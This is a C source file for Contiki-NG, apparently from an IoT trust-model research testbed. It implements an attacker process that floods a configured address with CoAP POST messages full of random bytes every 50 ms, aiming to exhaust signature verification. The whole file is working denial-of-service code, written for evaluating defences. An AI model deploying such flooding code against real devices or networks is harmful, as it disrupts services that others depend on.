#include "contiki.h"
#include "sys/log.h"
#include "uiplib.h"

#include "trust.h" // from node/trust

#include "platform-crypto-support.h"

#include "coap.h"
#include "coap-callback-api.h"
/*-------------------------------------------------------------------------------------------------------------------*/
#ifndef DOS_PERIOD_MS
#define DOS_PERIOD_MS 50
#endif
#ifndef DOS_ADDRESS
#define DOS_ADDRESS ""
#endif
/*-------------------------------------------------------------------------------------------------------------------*/
#define DOS_PERIOD_CLOCK ((DOS_PERIOD_MS * CLOCK_SECOND) / 1000)
_Static_assert(DOS_PERIOD_CLOCK > 0, "CLOCK_SECOND needs to be at least 1000");
/*-------------------------------------------------------------------------------------------------------------------*/
#pragma message "Adversary will target " DOS_ADDRESS
/*-------------------------------------------------------------------------------------------------------------------*/
#define LOG_MODULE "attack-dtn"
#define LOG_LEVEL LOG_LEVEL_DBG
/*-------------------------------------------------------------------------------------------------------------------*/
PROCESS(dos_target_network, "dos_target_network");
/*-------------------------------------------------------------------------------------------------------------------*/
// This attack will send a certificate with a signature generated from a valid key pair
// The aim is for this message to be sent often in order to DoS signature verification
// We create the signed message once and then send it often
/*-------------------------------------------------------------------------------------------------------------------*/
static coap_endpoint_t ep;
static coap_message_t msg;
static coap_callback_request_state_t coap_callback;
static uint8_t payload_buf[MAX_TRUST_PAYLOAD];
/*-------------------------------------------------------------------------------------------------------------------*/
static struct etimer send_timer;
/*-------------------------------------------------------------------------------------------------------------------*/
static bool build_message(void)
{
    if (!uiplib_ipaddrconv(DOS_ADDRESS, &ep.ipaddr))
    {
        LOG_ERR("Failed to parse IP address " DOS_ADDRESS "\n");
        return false;
    }

    ep.secure = 0;
    ep.port = UIP_HTONS(COAP_DEFAULT_PORT);

    // This is a non-confirmable message
    coap_init_message(&msg, COAP_TYPE_NON, COAP_POST, 0);
    coap_set_header_content_format(&msg, APPLICATION_CBOR);
    coap_set_header_uri_path(&msg, TRUST_COAP_URI);

    bool result = crypto_fill_random(payload_buf, CC_ARRAY_SIZE(payload_buf));
    if (!result)
    {
        LOG_ERR("Failed to generate data\n");
        return false;
    }

    int coap_payload_len = coap_set_payload(&msg, payload_buf, CC_ARRAY_SIZE(payload_buf));
    if (coap_payload_len < CC_ARRAY_SIZE(payload_buf))
    {
        LOG_WARN("Messaged length truncated to = %d\n", coap_payload_len);
    }

    return true;
}
/*-------------------------------------------------------------------------------------------------------------------*/
PROCESS_THREAD(dos_target_network, ev, data)
{
    PROCESS_BEGIN();

    LOG_INFO("Starting %s\n", PROCESS_NAME_STRING(PROCESS_CURRENT()));

    if (!build_message())
    {
        LOG_ERR("Failed to build the message to send, quitting test\n");
        PROCESS_EXIT();
    }

    LOG_INFO("Message has been created, starting to send periodically "
             "every " CC_STRINGIFY(DOS_PERIOD_MS) "ms\n");

    etimer_set(&send_timer, DOS_PERIOD_CLOCK);

    // Send the message periodically
    while (1)
    {
        PROCESS_WAIT_EVENT_UNTIL(ev == PROCESS_EVENT_TIMER && data == &send_timer);

        LOG_DBG("coap_send_request dos_target_network start\n");

        // No callback is set, as no confirmation of the message being received will be sent to us
        int ret = coap_send_request(&coap_callback, &ep, &msg, NULL);
        if (ret)
        {
            LOG_DBG("coap_send_request dos_target_network done\n");
        }
        else
        {
            LOG_ERR("coap_send_request dos_target_network failed %d\n", ret);
        }

        etimer_reset(&send_timer);
    }

    PROCESS_END();
}
/*-------------------------------------------------------------------------------------------------------------------*/
